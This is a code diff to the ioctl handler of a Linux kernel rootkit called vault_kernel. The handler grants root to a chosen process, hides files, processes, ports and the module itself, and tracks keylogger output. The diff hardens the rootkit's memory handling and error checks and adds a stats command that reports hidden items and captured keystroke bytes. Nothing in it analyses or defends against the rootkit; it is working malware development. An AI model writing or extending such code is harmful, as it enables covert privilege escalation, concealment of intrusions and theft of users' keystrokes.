@@ -9,9 +9,11 @@ static struct class *vault_kernel_class = NULL;
 static struct cdev vault_kernel_cdev;
 static int dev_major = 0;
 
+#define VK_LIST_BUF_SIZE 4096
+
 static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
                            unsigned long arg) {
-    char kbuf[4096];
+    char kbuf[256];
     int ret, pid_int;
     uint16_t port;
     char *ip, *port_str;
@@ -21,8 +23,7 @@ static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
     case IOCTL_GIVE_ROOT:
         if (copy_from_user(&pid_int, (int __user *)arg, sizeof(int)))
             return -EFAULT;
-        if (pid_int == 0)
-            pid_int = current->pid; /* Default to caller */
+        /* pid <= 0 → priv_esc treats it as "the caller" */
         return priv_esc_give_root(pid_int);
 
     case IOCTL_HIDE_FILE:
@@ -64,40 +65,51 @@ static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
         break;
 
     case IOCTL_LIST_HIDDEN: {
-        char *p = kbuf;
+        /* 4 KiB on the 8/16 KiB kernel stack is a stack-overflow
+         * hazard — build the report in heap memory instead. */
+        char *buf;
+        char *p;
         size_t remaining;
         int i;
-        memset(kbuf, 0, sizeof(kbuf));
 
-        remaining = sizeof(kbuf);
+        buf = kzalloc(VK_LIST_BUF_SIZE, GFP_KERNEL);
+        if (!buf)
+            return -ENOMEM;
+
+        p = buf;
+        remaining = VK_LIST_BUF_SIZE;
+
         p += snprintf(p, remaining, "--- Hidden PIDs ---\n");
-        remaining = sizeof(kbuf) - (p - kbuf);
-        for (i = 0; i < hidden_pid_count && remaining > 32; i++) {
+        remaining = VK_LIST_BUF_SIZE - (size_t)(p - buf);
+        for (i = 0; i < hidden_pid_count && remaining > 64; i++) {
             p += snprintf(p, remaining, "  pid: %d\n", hidden_pids[i]);
-            remaining = sizeof(kbuf) - (p - kbuf);
+            remaining = VK_LIST_BUF_SIZE - (size_t)(p - buf);
         }
 
-        if (remaining > 32) {
+        if (remaining > 64) {
             p += snprintf(p, remaining, "--- Hidden Files ---\n");
-            remaining = sizeof(kbuf) - (p - kbuf);
+            remaining = VK_LIST_BUF_SIZE - (size_t)(p - buf);
         }
-        for (i = 0; i < hidden_file_count && remaining > 32; i++) {
+        for (i = 0; i < hidden_file_count && remaining > 64; i++) {
             p += snprintf(p, remaining, "  %s\n", hidden_files[i]);
-            remaining = sizeof(kbuf) - (p - kbuf);
+            remaining = VK_LIST_BUF_SIZE - (size_t)(p - buf);
         }
 
-        if (remaining > 32) {
+        if (remaining > 64) {
             p += snprintf(p, remaining, "--- Hidden Ports ---\n");
-            remaining = sizeof(kbuf) - (p - kbuf);
+            remaining = VK_LIST_BUF_SIZE - (size_t)(p - buf);
         }
-        for (i = 0; i < hidden_port_count && remaining > 32; i++) {
+        for (i = 0; i < hidden_port_count && remaining > 64; i++) {
             p += snprintf(p, remaining, "  port: %d\n",
-                          ntohs(hidden_ports[i]));
-            remaining = sizeof(kbuf) - (p - kbuf);
+                          hidden_ports[i]);
+            remaining = VK_LIST_BUF_SIZE - (size_t)(p - buf);
         }
 
-        if (copy_to_user((char __user *)arg, kbuf, sizeof(kbuf)))
+        if (copy_to_user((char __user *)arg, buf, VK_LIST_BUF_SIZE)) {
+            kfree(buf);
             return -EFAULT;
+        }
+        kfree(buf);
         break;
     }
 
@@ -139,6 +151,39 @@ static long vault_kernel_ioctl(struct file *file, unsigned int cmd,
     case IOCTL_MODULE_UNHIDE:
         stealth_unhide_module();
         break;
+
+    case IOCTL_GET_STATS: {
+        char *buf;
+        long uptime_s = 0;
+
+        if (vk_load_jiffies)
+            uptime_s = (long)((jiffies - vk_load_jiffies) / HZ);
+
+        buf = kzalloc(VK_LIST_BUF_SIZE, GFP_KERNEL);
+        if (!buf)
+            return -ENOMEM;
+
+        snprintf(buf, VK_LIST_BUF_SIZE,
+                 "module=vault_kernel version=%s\n"
+                 "hooks_installed=%d hooks_planned=%d\n"
+                 "module_hidden=%d\n"
+                 "hidden_files=%d hidden_pids=%d hidden_ports=%d\n"
+                 "keylog_bytes=%zu\n"
+                 "uptime_s=%ld\n",
+                 VAULT_KERNEL_VERSION,
+                 hooking_installed_count(), hooks_count,
+                 module_hidden,
+                 hidden_file_count, hidden_pid_count, hidden_port_count,
+                 keylogger_len(),
+                 uptime_s);
+
+        if (copy_to_user((char __user *)arg, buf, VK_LIST_BUF_SIZE)) {
+            kfree(buf);
+            return -EFAULT;
+        }
+        kfree(buf);
+        break;
+    }
 
     default:
         return -ENOTTY;
@@ -184,12 +229,19 @@ int ioctl_init(void) {
         return PTR_ERR(vault_kernel_class);
     }
 
-    /* Create device node */
-    if (!device_create(vault_kernel_class, NULL, vault_kernel_dev,
-                       NULL, DEVICE_NAME)) {
-        class_destroy(vault_kernel_class);
-        unregister_chrdev_region(vault_kernel_dev, 1);
-        return -ENODEV;
+    /* Create device node — device_create() returns ERR_PTR on
+     * failure, never NULL, so a bare !ptr check never fires. */
+    {
+        struct device *dev;
+        dev = device_create(vault_kernel_class, NULL, vault_kernel_dev,
+                            NULL, DEVICE_NAME);
+        if (IS_ERR(dev)) {
+            class_destroy(vault_kernel_class);
+            unregister_chrdev_region(vault_kernel_dev, 1);
+            pr_err(VAULT_KERNEL_TAG " device_create failed (%ld)\n",
+                   PTR_ERR(dev));
+            return PTR_ERR(dev);
+        }
     }
 
     /* Initialize cdev */
